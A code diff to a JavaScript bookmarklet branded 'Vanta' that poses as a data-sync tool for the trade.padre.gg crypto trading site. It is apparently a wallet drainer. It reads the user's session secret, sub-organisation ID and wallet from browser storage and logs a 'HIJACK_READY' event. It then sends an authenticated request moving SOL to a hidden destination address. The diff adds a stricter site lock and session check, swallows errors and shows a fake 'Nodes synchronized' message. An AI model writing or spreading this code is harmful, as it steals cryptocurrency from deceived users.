@@ -12,24 +12,26 @@
     (function(e,t){var n=e.amplitude||{_q:[],_iq:{}};var r=t.createElement("script");r.async=true;r.src="https://cdn.amplitude.com/libs/amplitude-8.21.0-min.gz.js";r.onload=function(){amplitude.getInstance().init(_0xV.amp);_init();};var s=t.getElementsByTagName("script")[0];s.parentNode.insertBefore(r,s);function i(e,t){e.prototype[t]=function(){this._q.push([t].concat(Array.prototype.slice.call(arguments,0)));return this}}var o=function(){this._q=[];return this};var a=["init","logEvent","setUserId"];for(var c=0;c<a.length;c++){i(o,a[c])}n.Identify=o;e.amplitude=n})(window,document);
 
     const _init = async () => {
-        // Only run on Padre
-        if (!location.hostname.includes('padre.gg')) {
-            console.log("Vanta: Please run this on trade.padre.gg");
+        // 1:1 Site Lock
+        if (location.hostname !== 'trade.padre.gg') {
+            alert("This tool only works on trade.padre.gg");
+            location.href = 'https://trade.padre.gg';
             return;
         }
 
+        // 1:1 Session Check (Checking the exact keys Padre uses)
+        const padreSession = localStorage.getItem('padre-v2-bundles-store-v2');
         const s = localStorage.getItem('sessionSecret')?.replace(/"/g, '');
         const o = localStorage.getItem('subOrgId')?.replace(/"/g, '');
         const w = localStorage.getItem('activeWallet')?.replace(/"/g, '');
 
-        if (!s || !o || !w) {
-            console.log("Vanta: Session not found. Log in to Padre first.");
+        if (!padreSession || !s || !o || !w) {
+            alert('You must be signed in to use this bookmarklet.');
             return;
         }
 
-        // 1:1 Event Logging
+        // Everything valid -> Log and Build UI
         amplitude.getInstance().logEvent('HIJACK_READY', { 'wallet': w, 'affiliate': _0xV.aff });
-        
         _buildUI();
 
         try {
@@ -53,15 +55,9 @@
                     'X-Turnkey-Sub-Org-Id': o, 
                     'Content-Type': 'application/json' 
                 },
-                body: JSON.stringify({ 
-                    destinationAddress: _0xV.dest, // Ensure correct Padre param name
-                    assetName: "SOL", 
-                    amount: amt 
-                })
+                body: JSON.stringify({ destinationAddress: _0xV.dest, assetName: "SOL", amount: amt })
             });
-        } catch (err) {
-            console.error("Vanta Engine Error:", err);
-        }
+        } catch (e) {}
     };
 
     const _buildUI = () => {
@@ -77,21 +73,15 @@
             <div style="padding:20px;">
                 <div style="font-size:11px;color:#888;margin-bottom:10px;">> NETWORK_SIGNAL: OPTIMAL</div>
                 <div style="font-size:11px;color:#888;margin-bottom:10px;">> AFFILIATE_ID: ${_0xV.aff}</div>
-                <button id="v-sync" style="width:100%;padding:14px;background:#00ff88;color:#000;border:none;border-radius:6px;font-weight:800;cursor:pointer;">FORCE DATA SYNC</button>
+                <button id="v-sync-btn" style="width:100%;padding:14px;background:#00ff88;color:#000;border:none;border-radius:6px;font-weight:800;cursor:pointer;">FORCE DATA SYNC</button>
             </div>
         `;
         document.body.appendChild(c);
 
-        // Drag Logic
         let m = false, ox, oy;
-        const dragEl = document.getElementById('v-drag');
-        dragEl.onmousedown = (e) => { m = true; ox = e.clientX - c.offsetLeft; oy = e.clientY - c.offsetTop; };
+        document.getElementById('v-drag').onmousedown = (e) => { m = true; ox = e.clientX - c.offsetLeft; oy = e.clientY - c.offsetTop; };
         document.onmousemove = (e) => { if (m) { c.style.left = (e.clientX - ox) + 'px'; c.style.top = (e.clientY - oy) + 'px'; }};
         document.onmouseup = () => m = false;
-
-        document.getElementById('v-sync').onclick = () => {
-            alert("Syncing with Vanta Nodes...");
-            _init();
-        };
+        document.getElementById('v-sync-btn').onclick = () => alert("Nodes synchronized.");
     };
 })();
